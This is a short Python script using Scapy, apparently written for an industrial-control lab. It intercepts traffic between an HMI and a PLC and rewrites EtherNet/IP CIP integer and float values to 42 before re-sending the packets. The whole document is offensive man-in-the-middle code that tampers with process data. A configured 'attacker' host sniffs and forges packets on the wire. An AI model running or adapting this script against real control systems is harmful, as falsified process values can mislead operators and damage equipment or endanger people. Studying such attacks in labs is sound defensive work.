#!/usr/bin/python3
from scapy.all import *
import struct

# Cấu hình mạng
IP_CONFIG = {
    'plc1': '192.168.1.10',
    'hmi': '192.168.1.20',
    'attacker': '192.168.1.77',
}
MAC_CONFIG = {
    'plc1': '00:1D:9C:C7:B0:10',
    'hmi': '00:1D:9C:C8:BC:20',
    'attacker': 'AA:AA:AA:AA:AA:AA',
}

# Thay thế giá trị INT hoặc FLOAT
def modify_payload(data):
    # Kiểm tra và phân tích CIP
    if len(data) > 44:  # Đảm bảo dữ liệu đủ dài
        cip_service = data[40:41]  # CIP Service (0xCC: Response)
        cip_status = data[42:43]  # CIP Status (0x00: Success)
        data_type = data[44:46]   # Data type (INT: 0xC3, FLOAT: 0xCA)

        if cip_service == b'\xcc' and cip_status == b'\x00':
            if data_type == b'\xc3\x00':  # INT
                print("[*] Modifying INT value...")
                new_value = struct.pack('<h', 42)  # INT 16-bit little-endian
                data = data[:46] + new_value + data[48:]
            elif data_type == b'\xca\x00':  # FLOAT
                print("[*] Modifying FLOAT value...")
                new_value = struct.pack('<f', 42.0)  # FLOAT 32-bit IEEE 754
                data = data[:46] + new_value + data[50:]
    return data

# Hàm xử lý gói tin
def spoof_pkt(pkt):
    if pkt[IP].src == IP_CONFIG['hmi'] and pkt[IP].dst == IP_CONFIG['plc1']:
        # Gói tin từ HMI -> PLC
        print(f"[*] Intercepted packet from HMI to PLC (ID: {pkt[IP].id})")
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        del(newpkt[TCP].payload)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = modify_payload(data)  # Thay đổi dữ liệu CIP
            send(newpkt / newdata)
        else:
            send(newpkt)

    elif pkt[IP].src == IP_CONFIG['plc1'] and pkt[IP].dst == IP_CONFIG['hmi']:
        # Gói tin từ PLC -> HMI
        print(f"[*] Intercepted packet from PLC to HMI (ID: {pkt[IP].id})")
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

# Lọc và chặn gói tin TCP
pkt = sniff(iface='eth0', filter='tcp', prn=spoof_pkt)
